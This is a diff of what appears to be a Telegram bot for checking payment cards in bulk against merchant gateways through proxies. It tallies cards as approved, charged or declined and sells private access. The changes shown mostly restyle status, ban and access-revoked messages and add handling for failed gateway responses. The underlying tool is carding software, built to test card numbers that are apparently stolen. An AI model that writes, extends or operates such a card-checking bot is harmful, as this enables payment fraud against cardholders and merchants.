-        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Tyrant_Xd", buttons=buttons)
+        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙏𝙮𝙧𝙖𝙣𝙩_𝙓𝙙", buttons=buttons)
     
     # Check if user has added proxy
     proxy_data = await get_user_proxy(event.sender_id)
@@ -1588,7 +1711,7 @@ async def process_ranfor_cards(event, cards, global_sites):
     user_id = event.sender_id
     total = len(cards)
     checked, approved, charged, declined = 0, 0, 0, 0
-    status_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
+    status_msg = await event.reply(f"```🔥 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙄𝙣𝙩𝙚𝙣𝙨𝙞𝙫𝙚𝙡𝙮 ⚡```")
 
     try:
         batch_size = 20
@@ -1627,7 +1750,10 @@ async def process_ranfor_cards(event, cards, global_sites):
             for j, (result, (card, site_used)) in enumerate(zip(results, task_cards)):
                 if user_id not in ACTIVE_MTXT_PROCESSES: break
 
-                if isinstance(result, Exception):
+                # Handle None result (API failed completely)
+                if result is None:
+                    result = {"Response": "API Error: No response from gateway", "Price": "-", "Gateway": "-"}
+                elif isinstance(result, Exception):
                     result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}
 
                 checked += 1
@@ -1705,7 +1831,7 @@ async def process_ranfor_cards(event, cards, global_sites):
                     [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")],
                     [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_ranfor:{user_id}".encode())]
                 ]
-                try: await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
+                try: await status_msg.edit("```⚡ 𝙑𝙚𝙧𝙞𝙛𝙮𝙞𝙣𝙜 𝘾𝙖𝙧𝙙𝙨 𝙎𝙚𝙦𝙪𝙚𝙣𝙩𝙞𝙖𝙡𝙡𝙮...```", buttons=buttons)
                 except: pass
                 await asyncio.sleep(0.1)
 
@@ -1782,7 +1908,7 @@ async def check_sites(event):
         buttons = [
             [Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+pNplrRLrEGY5NTU0")]
         ]
-        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Tyrant_Xd", buttons=buttons)
+        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙏𝙮𝙧𝙖𝙣𝙩_𝙓𝙙", buttons=buttons)
 
     # Check if user has added proxy
     proxy_data = await get_user_proxy(event.sender_id)
@@ -2127,7 +2253,7 @@ async def unauth_user(event):
             await event.reply(f"✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}!")
 
             try:
-                await client.send_message(user_id, f"⚠️ 𝙔𝙤𝙪𝙧 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨 𝙃𝙖𝙨 𝘽𝙚𝙚𝙣 𝙍𝙚𝙫𝙤𝙠𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙞𝙣𝙦𝙪𝙞𝙧𝙞𝙚𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Tyrant_Xd")
+                await client.send_message(user_id, f"⚠️ 𝙔𝙤𝙪𝙧 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨 𝙃𝙖𝙨 𝘽𝙚𝙚𝙣 𝙍𝙚𝙫𝙤𝙠𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙞𝙣𝙦𝙪𝙞𝙧𝙞𝙚𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙏𝙮𝙧𝙖𝙣𝙩_𝙓𝙙")
             except:
                 pass
         else:
@@ -2159,7 +2285,7 @@ async def ban_user_command(event):
         await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙖𝙣𝙣𝙚𝙙!")
 
         try:
-            await client.send_message(user_id, f"🚫 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝘽𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙖𝙗𝙡𝙚 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙤𝙧 𝙜𝙧𝙤𝙪𝙥 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Tyrant_Xd")
+            await client.send_message(user_id, f"🚫 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝘽𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙖𝙗𝙡𝙚 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙤𝙧 𝙜𝙧𝙤𝙪𝙥 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙏𝙮𝙧𝙖𝙣𝙩_𝙓𝙙")
         except:
             pass
 
@@ -2223,7 +2349,7 @@ async def main():
     }
 
     
-    print("𝘽𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 💨")
+    print("✅ 𝘽𝙊𝙏 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 ⚡")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
